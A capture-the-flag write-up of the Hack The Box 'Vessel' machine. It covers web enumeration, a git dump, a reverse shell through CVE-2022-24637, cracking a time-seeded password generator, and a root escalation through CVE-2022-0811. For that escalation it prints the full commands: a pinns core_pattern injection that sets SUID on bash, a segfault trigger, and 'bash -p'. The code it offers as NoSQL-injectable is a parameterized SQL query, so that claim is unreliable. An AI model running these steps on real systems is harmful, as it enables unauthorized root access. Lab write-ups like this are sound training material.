---
title: "Hack The Box - Vessel [Hard]"
date: 2023-02-12T10:42:27+03:00
draft: false
description: 
---

# Overview

Since it becomes very time consuming doing this in a video this write-up is going to be in a text.

The machine is labeled hard with a good reason, most of the tasks are time consuming but there are some interesting vulnerabilities like [CVE-2022-0811](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/) and [CVE-2022-24637](https://www.exploit-db.com/exploits/51026).

On top of these we have [NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection) and some PE reverse engineering.

# Write-up

### Flag 1

First I began enumerating the whole website with `ffuf`.

```
$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u "http://vessel.htb/FUZZ" -fs 26
```

With that I discovered a folder called `dev` which then led me to dumping the git repository of the website:

```
$ git-dumper http://vessel.htb/dev/.git ./website_dump
```

With the website avaliable, I can check the actual source code for vulnerabilities, immediately after opening the `routes/index.js`

```javascript
...
let username = req.body.username;
let password = req.body.password;
if (username && password) {
connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) { ...
```

With that I can see that the login page is vulnerable to NoSQL Injection. Since that the code doesn't check if the passed values if they are objects, I can use NoSQL payload to successfully login to the `/admin` page. 

Upon another discovery in the admin panel, I found that there is another domain on the host called `openwebanalytics`. From further investigation over what can be exploted there I landed on [CVE-2022-24637](https://www.exploit-db.com/exploits/51026). With that I could run a successful reverse shell on the machine. 

Using [linpeas](https://github.com/carlospolop/PEASS-ng) I found some useful information over the user `steven`

```
/home/steven/passwordGenerator # Windows PE Exectuable
/home/steven/.notes/screenshot.png # Screenshot of some program
/home/steven/.notes/notes.pdf # Password protected PDF
```

I suspected that the `screenshot.png` is a screenshot out of the `passwordGenerator`. The `passwordGenerator` was unusually big and the whole use of that binary is to create 'secure' passwords. I noticed 'python' icon over the icon on the binary and I suspected that this could be a packed python project with `PyInstaller`. I confirmed that when I loaded the whole thing in Ghidra/IDA. I used [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to extract the `*.pyc` files, which I then used the [uncomplyle6](https://pypi.org/project/uncompyle6/) to decompile the `*.pyc` files. Which led me to the actual source code of that binary:

This is the function that generates the password:

```python
def genPassword(self):
        length = value
        char = index
        if char == 0:
            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
        else:
            if char == 1:
                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
            else:
                if char == 2:
                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
                else:
                    try:
                        qsrand(QTime.currentTime().msec())
                        password = ''
                        for i in range(length):
                            idx = qrand() % len(charset)
                            nchar = charset[idx]
                            password += str(nchar)

                    except:
                        msg = QMessageBox()
                        msg.setWindowTitle('Error')
                        msg.setText('Error while generating password!, Send a message to the Author!')
                        x = msg.exec_()

                return password
```

I edited the `length` to 32 (as I have it on the screenshot) and edit the script a bit more to create a word list out of passwords. I can do that because `QTime.currentTime().msec()` which are the numbers from 1-1000 with that range I have a big chance of guessing the generated password. 

> **Note**: This process can be a bit frustrating since it takes time to generate the word lists. I personally spent little over 1 hour.

Then I used `pdfcrack` to crack the password of the PDF, there I found the password for the user `ethan` and I successfully logged in with it and I found the first flag.

### Flag 2

I ran `linpeas.sh` again, and I found the following `SUID` binary:

```
...
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root ethan 814936 Mar 15  2022 /usr/bin/pinns    
...
```

I searched around a bit what is this, and I landed on the [CVE-2022-0811](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/) which exploited this binary. While doing this, I noticed that I also have the `runc`. 

```                                                                                               
╔══════════╣ Container related tools present
/usr/sbin/runc       
```

This was a very tricky one, and it needs some understanding of what's going on to successfully execute the attack. You can check out the link I've provided for [CVE-2022-0811](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/) to understand more about it. On the actual POC they have used Kubernetes, on our end I had to use  `runc`.

The parameters that are being passed to `pinns` are not being sanitized and validated, so I can use that to execute code with root access.

I needed to create a container using the `runc` without using `root` so I've used the `--rootless` arg.

Reference: https://github.com/opencontainers/runc/#rootless-containers

```
$ mkdir /tmp/syl
$ cd /tmp/syl/
$ runc spec --rootless
$ mkdir rootfs
$ echo "chmod +s /usr/bin/bash" > syl.sh
```

Then I should mount the root to the root of the container:

Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation

```
$ runc --root /tmp/syl/ run alpine
# cat /etc/machine-id
c4ca4238a0b923820dcc509a6f75849b
```

This will run the container and spawn a shell. Next I would ssh into the machine from another session to execute the `pinns` binary to our container. 

```
$ /usr/bin/pinns -d /var/run -f c4ca4238a0b923820dcc509a6f75849b -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/syl/syl.sh #' --ipc --net --uts --cgroup
```

Then I need to trigger a core dump so that the `pinns` would execute the script in a case of a core dump. Following the PoC in crowdstrike:

```
# ulimit -c unlimited
# ulimit -c
unlimited
# tail -f /dev/null &
# ps
.. Find the `tail -f /dev/null` PID
# kill -SIGSEGV {thePID}
[1]+  Segmentation fault (core dumped) tail -f /dev/null
```

Back to the other session

```
$ bash -p
$ cat /root/root.txt
{HASH}
```
